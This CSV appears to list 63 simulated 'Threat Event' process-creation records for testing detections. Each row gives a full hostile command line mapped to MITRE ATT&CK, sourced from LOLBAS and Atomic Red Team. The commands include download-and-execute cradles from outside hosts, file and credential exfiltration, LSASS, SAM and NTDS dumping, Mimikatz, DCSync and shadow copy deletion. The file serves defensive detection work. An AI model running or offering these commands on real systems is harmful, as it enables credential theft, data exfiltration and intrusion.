id,simulation_type,enabled,dest,description,parent_process,process_path,process_name,process,mitre_tactic,mitre_technique,sources,time_delay_seconds
PROC-TE-01,Threat Event,TRUE,WKS01,Shadow copy deletion with vssadmin.exe,C:\Windows\system32\cmd.exe,C:\Windows\system32\vssadmin.exe,vssadmin.exe,vssadmin.exe delete shadows /for=C,"Impact
Execution","Inhibit System Recovery
Command and Scripting Interpreter: Windows Command Shell",,
PROC-TE-02,Threat Event,TRUE,WKS02,Whoami being used for local groups recon,C:\Windows\system32\cmd.exe,C:\Windows\system32\whoami.exe,whoami.exe,whoami /groups,"Discovery
Execution","System Owner/User Discovery
Command and Scripting Interpreter: Windows Command Shell",,
PROC-TE-03,Threat Event,TRUE,WKS03,Process enumeration/discovery with tasklist,C:\Windows\system32\cmd.exe,C:\Windows\system32\tasklist.exe,tasklist.exe,tasklist,"Discovery
Execution","Process Discovery
Command and Scripting Interpreter: Windows Command Shell",,
PROC-TE-04,Threat Event,TRUE,SRV04,Apache2 webserver process spawning whoami (recon commands via webshell),/usr/sbin/apache2,/usr/bin/whoami,whoami,/usr/bin/whoami,"Persistence
Initial Access
Execution","Server Software Component: Web Shell
Exploit Public-Facing Application
Exploitation for Client Execution",,
PROC-TE-05,Threat Event,TRUE,UBUNTU05,Wget being used to download a shell script from a remote IP,/bin/bash,/usr/bin/wget,wget,wget http://193.176.183.245/a.sh,"Command and Control
Execution","Ingress Tool Transfer
Command and Scripting Interpreter: Unix Shell",,
PROC-TE-06,Threat Event,TRUE,UBUNTU06,Reading /etc/passwd with cat,/bin/bash,/usr/bin/cat,cat,cat /etc/passwd,"Credential Access
Execution","OS Credential Dumping
Command and Scripting Interpreter: Unix Shell",,
PROC-TE-07,Threat Event,TRUE,UBUNTU07,Reading /etc/shadow with cat,/bin/bash,/usr/bin/cat,cat,cat /etc/shadow,"Credential Access
Execution","OS Credential Dumping
Command and Scripting Interpreter: Unix Shell",,
PROC-TE-08,Threat Event,TRUE,UBUNTU08,Unix/Linux in-memory curl cradle (fileless execution),/usr/bin/dash,/usr/bin/curl,curl,curl http://193.176.183.245/ahdytg | sh,"Command and Control
Execution","Ingress Tool Transfer
Command and Scripting Interpreter: Unix Shell",,
PROC-TE-09,Threat Event,TRUE,WKS09,Tool Ingress via Appinstaller.exe (Lolbas Project),C:\Windows\system32\explorer.exe,C:\Program Files\WindowsApps\Microsoft.DesktopAppInstaller_1.11.2521.0_x64__8wekyb3d8bbwe\AppInstaller.exe,AppInstaller.exe,C:\Program Files\WindowsApps\Microsoft.DesktopAppInstaller_1.11.2521.0_x64__8wekyb3d8bbwe\AppInstaller.exe start ms-appinstaller://?source=https://pastebin.com/raw/tdyShwLx,Command and Control,Ingress Tool Transfer,https://lolbas-project.github.io/lolbas/Binaries/AppInstaller/,
PROC-TE-10,Threat Event,TRUE,WKS10,Exfiltration via Windows Bash.exe (Lolbas Project),C:\Windows\System32\cmd.exe,C:\Windows\System32\bash.exe,bash.exe,C:\Windows\System32\bash.exe -c 'cat file_to_exfil.zip > /dev/tcp/193.176.183.245',"Exfiltration
Execution","Exfiltration Over C2 Channel
Command and Scripting Interpreter: Windows Command Shell",https://lolbas-project.github.io/lolbas/Binaries/Bash/,
PROC-TE-11,Threat Event,TRUE,WKS11,Tool Ingress via Bitsadmin.exe (Lolbas Project),C:\Windows\System32\cmd.exe,C:\Windows\System32\bitsadmin.exe,bitsadmin.exe,C:\Windows\System32\bitsadmin.exe /create 1 bitsadmin /addfile 1 https://live.sysinternals.com/autoruns.exe c:\data\playfolder\autoruns.exe bitsadmin /RESUME 1 bitsadmin /complete 1,"Command and Control
Execution
Defense Evasion
Persistence","Ingress Tool Transfer
Command and Scripting Interpreter: Windows Command Shell
BITS Jobs",https://lolbas-project.github.io/lolbas/Binaries/Bitsadmin/,
PROC-TE-12,Threat Event,TRUE,WKS12,Bitsadmin.exe being used to execute payload stored in Alternate Data Stream (Lolbas Project),C:\Windows\System32\cmd.exe,C:\Windows\System32\bitsadmin.exe,bitsadmin.exe,C:\Windows\System32\bitsadmin.exe /addfile 1 c:\windows\system32\cmd.exe c:\data\playfolder\cmd.exe bitsadmin /SetNotifyCmdLine 1 c:\data\playfolder\1.txt:cmd.exe NULL bitsadmin /RESUME 1 bitsadmin /complete 1,"Defense Evasion
Execution
Persistence","Hide Artifacts: NTFS File Attributes
Command and Scripting Interpreter: Windows Command Shell
BITS Jobs",https://lolbas-project.github.io/lolbas/Binaries/Bitsadmin/,
PROC-TE-13,Threat Event,TRUE,WKS13,Bitsadmin.exe being used to copy cmd.exe to alternate location/name (Lolbas Project),C:\Windows\System32\cmd.exe,C:\Windows\System32\bitsadmin.exe,bitsadmin.exe,C:\Windows\System32\bitsadmin.exe /create 1 & bitsadmin /addfile 1 c:\windows\system32\cmd.exe c:\data\playfolder\cmd.exe & bitsadmin /RESUME 1 & bitsadmin /Complete 1 & bitsadmin /reset,"Defense Evasion
Execution
Persistence","Masquerading: Rename System Utilities
Command and Scripting Interpreter: Windows Command Shell
BITS Jobs",https://lolbas-project.github.io/lolbas/Binaries/Bitsadmin/,
PROC-TE-14,Threat Event,TRUE,WKS14,Certoc.exe being used for Tool Ingress (Lolbas Project),C:\Windows\System32\cmd.exe,C:\windows\system32\certoc.exe,certoc.exe,C:\windows\system32\certoc.exe -GetCACAPS https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/CodeExecution/Invoke-DllInjection.ps1,"Command and Control
Execution","Ingress Tool Transfer
Command and Scripting Interpreter: Windows Command Shell",https://lolbas-project.github.io/lolbas/Binaries/Certoc/,
PROC-TE-15,Threat Event,TRUE,WKS15,CertReq.exe being used for Exfiltration (Lolbas Project),C:\Windows\System32\cmd.exe,C:\Windows\System32\certreq.exe,certreq.exe,C:\Windows\System32\certreq.exe -Post -config https://hy7dy.xyz/ c:\windows\win.ini,"Exfiltration
Execution","Exfiltration Over C2 Channel
Command and Scripting Interpreter: Windows Command Shell",https://lolbas-project.github.io/lolbas/Binaries/Certreq/,
PROC-TE-16,Threat Event,TRUE,WKS16,Certutil.exe being used for Tool Ingress (Lolbas Project),C:\Windows\System32\cmd.exe,C:\Windows\System32\certutil.exe,certutil.exe,C:\Windows\System32\certutil.exe -urlcache -split -f http://7-zip.org/a/7z1604-x64.exe 7zip.exe,"Command and Control
Execution","Ingress Tool Transfer
Command and Scripting Interpreter: Windows Command Shell",https://lolbas-project.github.io/lolbas/Binaries/Certutil/,
PROC-TE-17,Threat Event,TRUE,WKS17,Cmd.exe executing payload stored in Alternate Data Stream (Lolbas Project),C:\Windows\System32\cmd.exe,C:\Windows\System32\cmd.exe,cmd.exe,C:\Windows\System32\cmd.exe - < fakefile.doc:payload.bat,Execution,Command and Scripting Interpreter: Windows Command Shell,https://lolbas-project.github.io/lolbas/Binaries/Cmd/,
PROC-TE-18,Threat Event,TRUE,WKS18,Cmd.exe exfiltration via WebDAV server (Lolbas Project),C:\Windows\System32\cmd.exe,C:\Windows\System32\cmd.exe,cmd.exe,"C:\Windows\System32\cmd.exe /C ""type C:\Public\creds.txt > \\\\193.176.183.245\pyr\creds.txt""","Exfiltration
Execution","Exfiltration Over C2 Channel
Command and Scripting Interpreter: Windows Command Shell",https://lolbas-project.github.io/lolbas/Binaries/Cmd/,
PROC-TE-19,Threat Event,TRUE,WKS19,Exfiltration via ConfigSecurityPolicy.exe (Lolbas Project),C:\Windows\System32\cmd.exe,C:\Program Files\Windows Defender\ConfigSecurityPolicy.exe,ConfigSecurityPolicy.exe,C:\Program Files\Windows Defender\ConfigSecurityPolicy.exe C:\Windows\System32\calc.exe https://ui78d.xyz/fiosiu?encodedfile,"Exfiltration
Execution","Exfiltration Over C2 Channel
Command and Scripting Interpreter: Windows Command Shell",https://lolbas-project.github.io/lolbas/Binaries/ConfigSecurityPolicy/,
PROC-TE-20,Threat Event,TRUE,WKS20,Tool Ingress via ConfigSecurityPolicy.exe (Lolbas Project),C:\Windows\System32\cmd.exe,C:\Program Files\Windows Defender\ConfigSecurityPolicy.exe,ConfigSecurityPolicy.exe,C:\Program Files\Windows Defender\ConfigSecurityPolicy.exe https://ui78d.xyz/fiosiu,"Command and Control
Execution","Ingress Tool Transfer
Command and Scripting Interpreter: Windows Command Shell",https://lolbas-project.github.io/lolbas/Binaries/ConfigSecurityPolicy/,
PROC-TE-21,Threat Event,TRUE,WKS21,Tool Ingress via hh.exe (Lolbas Project),C:\Windows\System32\cmd.exe,C:\Windows\SysWOW64\hh.exe,hh.exe,C:\Windows\SysWOW64\hh.exe https://ui78d.xyz/fiosiu,"Command and Control
Execution","Ingress Tool Transfer
Command and Scripting Interpreter: Windows Command Shell",https://lolbas-project.github.io/lolbas/Binaries/Hh/,
PROC-TE-22,Threat Event,TRUE,WKS22,Tool Ingress via ieexec.exe (Lolbas Project),C:\Windows\System32\cmd.exe,C:\Windows\Microsoft.NET\Framework\v2.0.50727\ieexec.exe,ieexec.exe,C:\Windows\Microsoft.NET\Framework\v2.0.50727\ieexec.exe https://ui78d.xyz/fiosiu,"Command and Control
Execution","Ingress Tool Transfer
Command and Scripting Interpreter: Windows Command Shell",https://lolbas-project.github.io/lolbas/Binaries/Ieexec/,
PROC-TE-23,Threat Event,TRUE,WKS23,Tool Ingress via MpCmdRun.exe (Lolbas Project),C:\Windows\System32\cmd.exe,C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.2008.4-0\MpCmdRun.exe,MpCmdRun.exe,C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.2008.4-0\MpCmdRun.exe -DownloadFile -url https://ui78d.xyz/fiosiu -path c:\temp\beacon.exe,"Command and Control
Execution","Ingress Tool Transfer
Command and Scripting Interpreter: Windows Command Shell",https://lolbas-project.github.io/lolbas/Binaries/MpCmdRun/,
PROC-TE-24,Threat Event,TRUE,WKS24,Arbitrary Code Execution via MSDT.exe (CVE-2022-30190 - Lolbas Project),C:\Program Files\Programs\Office 2019\Office14\excel.exe,C:\Windows\System32\Msdt.exe,Msdt.exe,"C:\Windows\System32\Msdt.exe /id PCWDiagnostic /skip force /param ""IT_LaunchMethod=ContextMenu IT_BrowseForFile=/../../$(calc).exe""","Defense Evasion
Execution","System Binary Proxy Execution
Exploitation for Client Execution",https://lolbas-project.github.io/lolbas/Binaries/Msdt/,
PROC-TE-25,Threat Event,TRUE,WKS25,Tool Ingress via msedge.exe (Lolbas Project),C:\Windows\System32\cmd.exe,C:\Program Files\Microsoft\Edge\Application\msedge.exe,msedge.exe,"C:\Program Files\Microsoft\Edge\Application\msedge.exe --headless --enable-logging --disable-gpu --dump-dom ""http://example.com/evil.b64.html"" > out.b64","Command and Control
Execution","Ingress Tool Transfer
Command and Scripting Interpreter: Windows Command Shell",https://lolbas-project.github.io/lolbas/Binaries/Msedge/,
PROC-TE-26,Threat Event,TRUE,WKS26,Mshta VBS Download Cradle (Lolbas Project),C:\Windows\System32\cmd.exe,C:\Windows\System32\mshta.exe,mshta.exe,"C:\Windows\System32\mshta.exe vbscript:Close(Execute(""GetObject(""""script:https://ui78d.xyz/ac.sct"""")""))","Defense Evasion
Execution
Command and Control","System Binary Proxy Execution: Mshta
Command and Scripting Interpreter: Windows Command Shell
Ingress Tool Transfer",https://lolbas-project.github.io/lolbas/Binaries/Mshta/,
PROC-TE-27,Threat Event,TRUE,WKS27,Mshta JavaScript Download Cradle (Lolbas Project),C:\Windows\System32\cmd.exe,C:\Windows\System32\mshta.exe,mshta.exe,"C:\Windows\System32\mshta.exe javascript:a=GetObject(""script:https://ui78d.xyz/al.sct"").Exec();close();","Defense Evasion
Execution
Command and Control","System Binary Proxy Execution: Mshta
Command and Scripting Interpreter: Windows Command Shell
Ingress Tool Transfer",https://lolbas-project.github.io/lolbas/Binaries/Mshta/,
PROC-TE-28,Threat Event,TRUE,WKS28,Mshta Tool Ingress (Lolbas Project),C:\Windows\System32\cmd.exe,C:\Windows\System32\mshta.exe,mshta.exe,C:\Windows\System32\mshta.exe https://ui78d.xyz/fiosiu,"Defense Evasion
Execution
Command and Control","System Binary Proxy Execution: Mshta
Command and Scripting Interpreter: Windows Command Shell
Ingress Tool Transfer",https://lolbas-project.github.io/lolbas/Binaries/Mshta/,
PROC-TE-29,Threat Event,TRUE,WKS29,Msiexec download cradle (Lolbas Project),C:\Windows\System32\cmd.exe,C:\Windows\System32\msiexec.exe,msiexec.exe,C:\Windows\System32\msiexec.exe /q /i http://ui78d.xyz/tmp/cmd.png,"Defense Evasion
Execution
Command and Control","System Binary Proxy Execution: Msiexec
Command and Scripting Interpreter: Windows Command Shell
Ingress Tool Transfer",https://lolbas-project.github.io/lolbas/Binaries/Msiexec/,
PROC-TE-30,Threat Event,TRUE,WKS30,Ngen.exe Tool Ingress (Lolbas Project),C:\Windows\System32\cmd.exe,C:\Windows\Microsoft.NET\Framework\v2.0.50727\ngen.exe,ngen.exe,C:\Windows\Microsoft.NET\Framework\v2.0.50727\ngen.exe http://ui78d.xyz/tmp/cmd.png,"Command and Control
Execution","Ingress Tool Transfer
Command and Scripting Interpreter: Windows Command Shell",https://lolbas-project.github.io/lolbas/Binaries/Ngen/,
PROC-TE-31,Threat Event,TRUE,WKS31,LSASS Dumping via rdrleakdiag.exe (Lolbas Project),C:\Windows\System32\cmd.exe,C:\windows\system32\rdrleakdiag.exe,rdrleakdiag.exe,C:\windows\system32\rdrleakdiag.exe /p 832 /o c:\evil /fullmemdmp /wait 1,"Credential Access
Execution","OS Credential Dumping: LSASS Memory
Command and Scripting Interpreter: Windows Command Shell",https://lolbas-project.github.io/lolbas/Binaries/Rdrleakdiag/,
PROC-TE-32,Threat Event,TRUE,WKS32,Credential Dumping via reg save (Lolbas Project),C:\Windows\System32\cmd.exe,C:\windows\system32\reg.exe,reg.exe,C:\windows\system32\reg.exe save HKLM\SECURITY c:\test\security.bak && reg save HKLM\SYSTEM c:\test\system.bak && reg save HKLM\SAM c:\test\sam.bak,"Credential Access
Execution","OS Credential Dumping: Security Account Manager
Command and Scripting Interpreter: Windows Command Shell",https://lolbas-project.github.io/lolbas/Binaries/Reg/,
PROC-TE-33,Threat Event,TRUE,WKS33,Tool Ingress via regsvr32.exe (Lolbas Project),C:\Windows\System32\cmd.exe,C:\Windows\System32\regsvr32.exe,regsvr32.exe,C:\Windows\System32\regsvr32.exe /s /n /u /i:http://ui78d.xyz/tmp/cmd.sct scrobj.dll,"Command and Control
Execution","Ingress Tool Transfer
Command and Scripting Interpreter: Windows Command Shell",https://lolbas-project.github.io/lolbas/Binaries/Regsvr32/,
PROC-TE-34,Threat Event,TRUE,WKS34,Tool Ingress via replace.exe (Lolbas Project),C:\Windows\System32\cmd.exe,C:\Windows\System32\replace.exe,replace.exe,C:\Windows\System32\replace.exe \\\\webdav.host.xyz\foo\bar.exe c:\Public\ /A,"Command and Control
Execution","Ingress Tool Transfer
Command and Scripting Interpreter: Windows Command Shell",https://lolbas-project.github.io/lolbas/Binaries/Replace/,
PROC-TE-35,Threat Event,TRUE,WKS35,NTLM hash leak via rpcping (Lolbas Project),C:\Windows\System32\cmd.exe,C:\Windows\System32\rpcping.exe,rpcping.exe,C:\Windows\System32\rpcping.exe -s 193.176.183.245 -e 1234 -a privacy -u NTLM,"Credential Access
Execution","Forced Authentication
Command and Scripting Interpreter: Windows Command Shell",https://lolbas-project.github.io/lolbas/Binaries/Rpcping/,
PROC-TE-36,Threat Event,TRUE,WKS36,Rundll32 cradle via UNC path (Lolbas Project),C:\Windows\System32\cmd.exe,C:\Windows\System32\rundll32.exe,rundll32.exe,"C:\Windows\System32\rundll32.exe \\\\193.176.183.245\share\payload.dll,EntryPoint","Command and Control
Execution","Ingress Tool Transfer
Command and Scripting Interpreter: Windows Command Shell",https://lolbas-project.github.io/lolbas/Binaries/Rundll32/,
PROC-TE-37,Threat Event,TRUE,WKS37,NTDS.dit theft via Wbadmin.exe (Lolbas Project),C:\Windows\System32\cmd.exe,C:\Windows\System32\wbadmin.exe,wbadmin.exe,"C:\Windows\System32\wbadmin start backup -backupTarget:C:\temp\ -include:C:\Windows\NTDS\NTDS.dit,C:\Windows\System32\config\SYSTEM -quiet","Credential Access
Execution","OS Credential Dumping: NTDS
Command and Scripting Interpreter: Windows Command Shell",https://lolbas-project.github.io/lolbas/Binaries/Wbadmin/,
PROC-TE-38,Threat Event,TRUE,WKS38,Tool Ingress via msedge_proxy.exe (Lolbas Project),C:\Windows\System32\cmd.exe,C:\Program Files (x86)\Microsoft\Edge\Application\msedge_proxy.exe,msedge_proxy.exe,C:\Program Files (x86)\Microsoft\Edge\Application\msedge_proxy.exe http://193.176.183.245/a.sh,"Command and Control
Execution","Ingress Tool Transfer
Command and Scripting Interpreter: Windows Command Shell",https://lolbas-project.github.io/lolbas/Binaries/msedge_proxy/,
PROC-TE-39,Threat Event,TRUE,WKS39,Dump LSASS.exe Memory using renamed ProcDump (Atomic Red Team),C:\Windows\System32\cmd.exe,C:\Users\joebob\Documents\onedrive.exe,onedrive.exe,C:\Users\joebob\Documents\onedrive.exe -accepteula -ma lsass.exe C:\Windows\Temp\lssd.dmp,"Credential Access
Execution","OS Credential Dumping: LSASS Memory
Command and Scripting Interpreter: Windows Command Shell",https://lolbas-project.github.io/lolbas/OtherMSBinaries/Procdump/,
PROC-TE-40,Threat Event,TRUE,WKS40,Dump LSASS.exe Memory using comsvcs.dll (Atomic Red Team),C:\Windows\System32\cmd.exe,C:\Windows\System32\rundll32.exe,rundll32.exe,"C:\Windows\System32\rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump (Get-Process lsass).id $env:TEMP\lsass-comsvcs.dmp full","Credential Access
Execution","OS Credential Dumping: LSASS Memory
Command and Scripting Interpreter: Windows Command Shell",https://lolbas-project.github.io/lolbas/Libraries/comsvcs/,
PROC-TE-41,Threat Event,TRUE,WKS41,Dump LSASS.exe Memory using Out-Minidump.ps1 (Atomic Red Team),C:\Windows\System32\cmd.exe,C:\Windows\System32\powershell.exe,powershell.exe,C:\Windows\System32\powershell.exe [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 New-Item -Type Directory C:\Users\joebob\ART\ExternalPayloads\ -ErrorAction Ignore -Force | Out-Null try{ IEX (IWR 'https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1003.001/src/Out-Minidump.ps1') -ErrorAction Stop} catch{ $_; exit $_.Exception.Response.StatusCode.Value__} get-process lsass | Out-Minidump,"Credential Access
Execution","OS Credential Dumping: LSASS Memory
Command and Scripting Interpreter: Windows Command Shell
Command and Scripting Interpreter: PowerShell",https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1003.001/T1003.001.md,
PROC-TE-42,Threat Event,TRUE,WKS42,Offline Credential Theft With Mimikatz (Atomic Red Team),C:\Windows\System32\cmd.exe,C:\Users\joebob\Documents\onedrive.exe,onedrive.exe,"C:\Users\joebob\Documents\onedrive.exe ""sekurlsa::minidump %tmp%\lss.DMP"" ""sekurlsa::logonpasswords full"" exit","Credential Access
Execution","OS Credential Dumping: LSASS Memory
Command and Scripting Interpreter: Windows Command Shell",https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1003.001/T1003.001.md,
PROC-TE-43,Threat Event,TRUE,WKS43,Powershell Mimikatz Cradle (Atomic Red Team),C:\Windows\System32\cmd.exe,C:\Windows\System32\powershell.exe,powershell.exe,C:\Windows\System32\powershell.exe IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f650520c4b1004daf8b3ec08007a0b945b91253a/Exfiltration/Invoke-Mimikatz.ps1'); Invoke-Mimikatz -DumpCreds,"Credential Access
Execution","OS Credential Dumping: LSASS Memory
Command and Scripting Interpreter: Windows Command Shell
Command and Scripting Interpreter: PowerShell",https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1003.001/T1003.001.md,
PROC-TE-44,Threat Event,TRUE,WKS44,Registry dumping via reg.exe (v1 // Atomic Red Team),C:\Windows\System32\cmd.exe,C:\Windows\System32\reg.exe,reg.exe,C:\Windows\System32\reg.exe save HKLM\sam %temp%\sam,"Credential Access
Execution","OS Credential Dumping: Security Account Manager
Command and Scripting Interpreter: Windows Command Shell",https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1003.002/T1003.002.md,
PROC-TE-45,Threat Event,TRUE,WKS45,Registry dumping via reg.exe (v2 // Atomic Red Team),C:\Windows\System32\cmd.exe,C:\Windows\System32\reg.exe,reg.exe,C:\Windows\System32\reg.exe save HKLM\system %temp%\system,"Credential Access
Execution","OS Credential Dumping: Security Account Manager
Command and Scripting Interpreter: Windows Command Shell",https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1003.002/T1003.002.md,
PROC-TE-46,Threat Event,TRUE,WKS46,Registry dumping via reg.exe (v3 // Atomic Red Team),C:\Windows\System32\cmd.exe,C:\Windows\System32\reg.exe,reg.exe,C:\Windows\System32\reg.exe save HKLM\security %temp%\security,"Credential Access
Execution","OS Credential Dumping: Security Account Manager
Command and Scripting Interpreter: Windows Command Shell",https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1003.002/T1003.002.md,
PROC-TE-47,Threat Event,TRUE,WKS47,esentutl.exe SAM copy (Atomic Red Team),C:\Windows\System32\cmd.exe,C:\Windows\System32\esentutl.exe,esentutl.exe,C:\Windows\System32\esentutl.exe /y /vss %SystemRoot%/system32/config/SAM /d %temp%/SAM,"Credential Access
Execution","OS Credential Dumping: Security Account Manager
Command and Scripting Interpreter: Windows Command Shell",https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1003.002/T1003.002.md,
PROC-TE-48,Threat Event,TRUE,WKS48,Dump volume shadow copy hives with certutil (Atomic Red Team),C:\Windows\System32\cmd.exe,C:\Windows\System32\cmd.exe,cmd.exe,"C:\Windows\System32\cmd.exe for /L %a in (1,1,10) do @(certutil -f -v -encodehex ""\\\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy%a\Windows\System32\config\SAM"" %temp%\SAMvss%a 2 >nul 2>&1) & dir /B %temp%\SAMvss*","Credential Access
Execution","OS Credential Dumping: Security Account Manager
Command and Scripting Interpreter: Windows Command Shell",https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1003.002/T1003.002.md,
PROC-TE-49,Threat Event,TRUE,WKS49,WinPwn - Loot local Credentials - Dump SAM-File for NTLM Hashes (Atomic Red Team),C:\Windows\System32\cmd.exe,C:\Windows\System32\powershell.exe,powershell.exe,C:\Windows\System32\powershell.exe $S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t' iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1') samfile -consoleoutput -noninteractive,"Credential Access
Execution","OS Credential Dumping: Security Account Manager
Command and Scripting Interpreter: Windows Command Shell
Command and Scripting Interpreter: PowerShell",https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1003.002/T1003.002.md,
PROC-TE-50,Threat Event,TRUE,WKS50,Dumping of SAM creds and secrets via Reg Export (v1 // Atomic Red Team),C:\Windows\System32\cmd.exe,C:\Windows\System32\reg.exe,reg.exe,C:\Windows\System32\reg.exe export HKLM\sam %temp%\sam,"Credential Access
Execution","OS Credential Dumping: Security Account Manager
Command and Scripting Interpreter: Windows Command Shell",https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1003.002/T1003.002.md,
PROC-TE-51,Threat Event,TRUE,WKS51,Dumping of SAM creds and secrets via Reg Export (v2 // Atomic Red Team),C:\Windows\System32\cmd.exe,C:\Windows\System32\reg.exe,reg.exe,C:\Windows\System32\reg.exe export HKLM\system %temp%\system,"Credential Access
Execution","OS Credential Dumping: Security Account Manager
Command and Scripting Interpreter: Windows Command Shell",https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1003.002/T1003.002.md,
PROC-TE-52,Threat Event,TRUE,WKS52,Dumping of SAM creds and secrets via Reg Export (v3 // Atomic Red Team),C:\Windows\System32\cmd.exe,C:\Windows\System32\reg.exe,reg.exe,C:\Windows\System32\reg.exe export HKLM\security %temp%\security,"Credential Access
Execution","OS Credential Dumping: Security Account Manager
Command and Scripting Interpreter: Windows Command Shell",https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1003.002/T1003.002.md,
PROC-TE-53,Threat Event,TRUE,WKS53,Create Volume Shadow Copy with vssadmin (Atomic Red Team),C:\Windows\System32\cmd.exe,C:\Windows\System32\vssadmin.exe,vssadmin.exe,C:\Windows\System32\vssadmin.exe create shadow /for=C,"Credential Access
Execution","OS Credential Dumping: NTDS
Command and Scripting Interpreter: Windows Command Shell",https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1003.003/T1003.003.md,
PROC-TE-54,Threat Event,TRUE,WKS54,Dump Active Directory Database with NTDSUtil (Atomic Red Team),C:\Windows\System32\cmd.exe,C:\Windows\System32\ntdsutil.exe,ntdsutil.exe,"C:\Windows\System32\ntdsutil.exe ""ac i ntds"" ""ifm"" ""create full C:\Windows\Temp\out"" q q","Credential Access
Execution","OS Credential Dumping: NTDS
Command and Scripting Interpreter: Windows Command Shell",https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1003.003/T1003.003.md,
PROC-TE-55,Threat Event,TRUE,WKS55,Create Volume Shadow Copy with WMI (Atomic Red Team),C:\Windows\System32\cmd.exe,C:\Windows\System32\wmic.exe,wmic.exe,C:\Windows\System32\wmic.exe shadowcopy call create Volume=C:\,"Credential Access
Execution","OS Credential Dumping: NTDS
Command and Scripting Interpreter: Windows Command Shell",https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1003.003/T1003.003.md,
PROC-TE-56,Threat Event,TRUE,WKS56,Create Volume Shadow Copy with Powershell (Atomic Red Team),C:\Windows\System32\cmd.exe,C:\Windows\System32\powershell.exe,powershell.exe,"C:\Windows\System32\powershell.exe (gwmi -list win32_shadowcopy).Create('C:\','ClientAccessible')","Credential Access
Execution","OS Credential Dumping: NTDS
Command and Scripting Interpreter: Windows Command Shell
Command and Scripting Interpreter: PowerShell",https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1003.003/T1003.003.md,
PROC-TE-57,Threat Event,TRUE,WKS57,Create Symlink to Volume Shadow Copy (Atomic Red Team),C:\Windows\System32\cmd.exe,C:\Windows\System32\vssadmin.exe,vssadmin.exe,C:\Windows\System32\vssadmin.exe create shadow /for=C:\ && mklink /D C:\Temp\vssstore \\\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1,"Credential Access
Execution","OS Credential Dumping: NTDS
Command and Scripting Interpreter: Windows Command Shell",https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1003.003/T1003.003.md,
PROC-TE-58,Threat Event,TRUE,WKS58,Create Volume Shadow Copy with diskshadow (Atomic Red Team),C:\Windows\System32\cmd.exe,C:\Windows\System32\diskshadow.exe,diskshadow.exe,C:\Windows\System32\diskshadow.exe /s C:\Windows\Temp\T1003.003\src\diskshadow.txt,"Credential Access
Execution","OS Credential Dumping: NTDS
Command and Scripting Interpreter: Windows Command Shell",https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1003.003/T1003.003.md,
PROC-TE-59,Threat Event,TRUE,WKS59,Dump Kerberos Tickets from LSA using dumper.ps1 (Atomic Red Team),C:\Windows\System32\cmd.exe,C:\Windows\System32\powershell.exe,powershell.exe,C:\Windows\System32\powershell.exe Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/MzHmO/PowershellKerberos/beed52acda37fc531ef0cb4df3fc2eb63a74bbb8/dumper.ps1'),"Credential Access
Execution","OS Credential Dumping: LSA Secrets
Command and Scripting Interpreter: Windows Command Shell
Command and Scripting Interpreter: PowerShell",https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1003.004/T1003.004.md,
PROC-TE-60,Threat Event,TRUE,WKS60,DCSync - Active Directory (Atomic Red Team),C:\Windows\System32\cmd.exe,C:\Windows\Public\onedrive.exe,onedrive.exe,"C:\Windows\Public\onedrive.exe ""lsadump::dcsync /domain:example.com /user:joebob@example.com"" ""exit""","Credential Access
Execution","OS Credential Dumping: DCSync
Command and Scripting Interpreter: Windows Command Shell",https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1003.006/T1003.006.md,
PROC-TE-61,Threat Event,TRUE,WKS61,Adfind Enumerate Active Directory Domain Controller Objects (Atomic Red Team),C:\Windows\System32\cmd.exe,C:\Users\Public\AdFind.exe,AdFind.exe,C:\Users\Public\AdFind.exe -sc dclist,"Discovery
Execution","Remote System Discovery
Command and Scripting Interpreter: Windows Command Shell",https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1018/T1018.md,
PROC-TE-62,Threat Event,TRUE,WKS62,Enumerate Active Directory Computers with Get-AdComputer (Atomic Red Team),C:\Windows\System32\cmd.exe,C:\Windows\System32\powershell.exe,powershell.exe,C:\Windows\System32\powershell.exe Get-AdComputer -Filter *,"Discovery
Execution","Remote System Discovery
Command and Scripting Interpreter: Windows Command Shell
Command and Scripting Interpreter: PowerShell",https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1018/T1018.md,
PROC-TE-63,Threat Event,TRUE,WKS63,Enumerate Active Directory Computers with ADSISearcher (Atomic Red Team),C:\Windows\System32\cmd.exe,C:\Windows\System32\powershell.exe,powershell.exe,"C:\Windows\System32\powershell.exe ([adsisearcher]""objectcategory=computer"").FindAll(); ([adsisearcher]""objectcategory=computer"").FindOne()","Discovery
Execution","Remote System Discovery
Command and Scripting Interpreter: Windows Command Shell
Command and Scripting Interpreter: PowerShell",https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1018/T1018.md,
